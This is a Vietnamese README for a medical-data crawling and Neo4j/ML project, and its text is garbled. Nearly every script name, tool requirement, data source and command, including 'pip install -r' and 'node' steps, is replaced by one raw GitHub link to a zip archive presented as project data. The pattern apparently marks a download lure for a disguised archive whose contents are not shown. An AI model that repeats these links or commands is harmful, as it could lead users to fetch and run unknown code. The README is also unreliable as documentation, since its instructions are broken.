# Data Crawl Project

Dự án thu thập và xử lý dữ liệu y tế.

## 📁 Cấu trúc dự án

```
datacrawl/
├── src/                    # Source code chính
│   ├── crawlers/          # Scripts crawler (JavaScript/Puppeteer)
│   ├── importers/         # Scripts import dữ liệu vào Neo4j
│   ├── ml/                # Machine Learning và Embedding scripts
│   ├── processors/        # Scripts xử lý và chuyển đổi dữ liệu
│   └── utils/             # Utility scripts và tools
├── notebooks/              # Jupyter notebooks (experiments, analysis)
├── data/                   # Thư mục chứa dữ liệu (có nhiều dữ liệu dung lượng lớn nên tôi để link drive)
├── disase_details/         # Thư mục chứa các file dữ liệu json rời rạc từ wiki (Do việc up dữ liệu lên git bị giới hạn số lượng file nên trong này tôi có tách ra làm 4 folder nhỏ -> hợp nhất về 1 folder gốc khi clone về)
├── models/                 # Thư mục chứa models ML
├── config/                 # File cấu hình                  
└── tests/                  # Test files
```

***Drive data:*** https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip

## 🚀 Cài đặt

### Yêu cầu hệ thống
- Python 3.8+
- https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip 14+ (cho crawlers)
- Neo4j Database

### Cài đặt dependencies

```bash
# Python dependencies
pip install -r https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip

# https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip dependencies
cd src/crawlers
npm install puppeteer
```

## 📋 Các thành phần chính

### 1. Crawlers (`src/crawlers/`)
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Crawl cấu trúc ICD-10 (chương và nhóm)
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Crawl chi tiết bệnh từ ICD-10

### 2. Importers (`src/importers/`)
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Import cấu trúc ICD-10 vào Neo4j
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Import thuốc và triệu chứng vào Neo4j
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Import vector embeddings vào Neo4j

### 3. ML/Embedding (`src/ml/`)
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Tạo embeddings cho dữ liệu
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: RAG embedding và query
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Fine-tune model ngôn ngữ nhỏ
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Download models từ HuggingFace

### 4. Processors (`src/processors/`)
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Tạo câu từ graph Neo4j
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Chuyển đổi format dữ liệu test
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Xử lý dữ liệu HPO
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Trích xuất dữ liệu bệnh từ Wikipedia
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Sắp xếp dữ liệu bệnh
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Parse dữ liệu ICD-10
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Map và merge dữ liệu
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Dịch dữ liệu

### 5. Utils (`src/utils/`)
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Đánh giá model với vector injection
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Query triplets từ Neo4j

### 6. Notebooks (`notebooks/`)
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Jupyter notebook cho fine-tuning Small Language Model (Qwen3-0.6B)

## 🔧 Cấu hình

Các file cấu hình chính nằm trong từng script. Cần cập nhật:
- Neo4j connection (URI, username, password)
- Đường dẫn file dữ liệu
- Model paths

## 📝 Quy trình sử dụng

### 1. Crawl dữ liệu
```bash
cd src/crawlers
node https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
node https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
```

### 2. Import vào Neo4j
```bash
cd src/importers
python https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
python https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
```

### 3. Tạo embeddings
```bash
cd src/ml
python https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
```

### 4. Import vectors
```bash
cd src/importers
python https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip
```

## 📊 Dữ liệu

### Nguồn dữ liệu
- **ICD-10**: [Hệ thống quản lý mã hóa lâm sàng khám chữa bệnh](https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip)
- **Thuốc**: [Drugs, Active Ingredients and Diseases database](https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip)

### Dữ liệu đã xử lý
Tất cả dữ liệu được lưu trong thư mục `data/`:
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Cấu trúc ICD-10
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Dữ liệu bệnh thô
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Dữ liệu ICD-10 đã xử lý
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Dữ liệu thuốc
- `https://raw.githubusercontent.com/HoNguyenLuong/Crawl_ICD_data/main/src/processors/data_IC_Crawl_2.3.zip`: Dữ liệu triệu chứng


